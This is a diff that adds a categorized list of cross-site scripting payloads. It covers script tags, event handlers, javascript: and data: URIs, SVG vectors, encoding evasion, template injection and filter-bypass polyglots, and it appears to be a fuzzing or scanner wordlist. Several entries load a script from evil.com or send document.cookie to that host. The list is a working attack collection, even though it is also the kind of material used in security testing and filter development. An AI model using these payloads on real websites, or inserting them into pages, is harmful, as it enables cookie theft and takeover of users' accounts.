@@ -1,0 +1,98 @@
+# XSS (Cross-Site Scripting) Payloads
+# Categories: script tags, event handlers, protocol handlers,
+#             encoding evasion, SVG, template injection, DOM-based
+
+# === Basic Script Tags ===
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+<SCRIPT>alert(1)</SCRIPT>
+<ScRiPt>alert(1)</ScRiPt>
+<script src="http://evil.com/x.js"></script>
+<script>document.location='http://evil.com/?c='+document.cookie</script>
+<script>new Image().src='http://evil.com/?c='+document.cookie;</script>
+<script/src="http://evil.com/x.js"></script>
+
+# === Event Handlers ===
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert(1)">
+<body onload=alert(1)>
+<svg onload=alert(1)>
+<div onmouseover="alert(1)">hover me</div>
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<video onerror=alert(1)><source src=x>
+<details open ontoggle=alert(1)>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<keygen onfocus=alert(1) autofocus>
+<frameset onload=alert(1)>
+<audio onerror=alert(1) src=x>
+<body/onload=alert(1)>
+" onfocus=alert(1) autofocus="
+' onfocus='alert(1)' autofocus='
+
+# === JavaScript Protocol ===
+<a href="javascript:alert(1)">click</a>
+<a href=javascript:alert(1)>click</a>
+<a href="jAvAsCrIpT:alert(1)">click</a>
+<a href="javascript:alert(document.cookie)">click</a>
+<iframe src="javascript:alert(1)">
+<form action="javascript:alert(1)">
+<button formaction="javascript:alert(1)">
+<object data="javascript:alert(1)">
+
+# === Data URIs ===
+<a href="data:text/html,<script>alert(1)</script>">click</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>
+<iframe src="data:text/html,<script>alert(1)</script>">
+<object data="data:text/html,<script>alert(1)</script>">
+<embed src="data:text/html,<script>alert(1)</script>">
+
+# === SVG Vectors ===
+<svg><script>alert(1)</script></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x>
+<svg><set onbegin=alert(1) attributeName=x>
+<svg><desc><script>alert(1)</script></desc></svg>
+<svg><foreignObject><body onload=alert(1)></foreignObject></svg>
+
+# === CSS/Style Injection ===
+<div style="background-image:url(javascript:alert(1))">
+<style>body{background-image:url("javascript:alert(1)")}</style>
+<link rel=stylesheet href="javascript:alert(1)">
+
+# === Encoding Evasion ===
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
+%3Cscript%3Ealert(1)%3C/script%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+\x3Cscript\x3Ealert(1)\x3C/script\x3E
+
+# === Template Injection ===
+{{constructor.constructor('alert(1)')()}}
+${alert(1)}
+#{alert(1)}
+{{7*7}}
+${7*7}
+
+# === DOM-Based ===
+<img src=x onerror="this.src='http://evil.com/?c='+document.cookie">
+<img src=x onerror="window.location='http://evil.com/?c='+document.cookie">
+
+# === Filter Bypass Tricks ===
+<img src="x" onerror="alert(1)">
+<img/src="x"/onerror="alert(1)">
+<img	src=x	onerror=alert(1)>
+<svg><script>alert&#40;1&#41;</script>
+<script>window['alert'](1)</script>
+<script>this['alert'](1)</script>
+<script>top['al'+'ert'](1)</script>
+<svg><use xlink:href="data:image/svg+xml,<svg onload=alert(1)>">
+
+# === Polyglot ===
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//
+</script><svg onload=alert(1)>
+'"><img src=x onerror=alert(1)>
+';alert(1)//
+"onmouseover="alert(1)
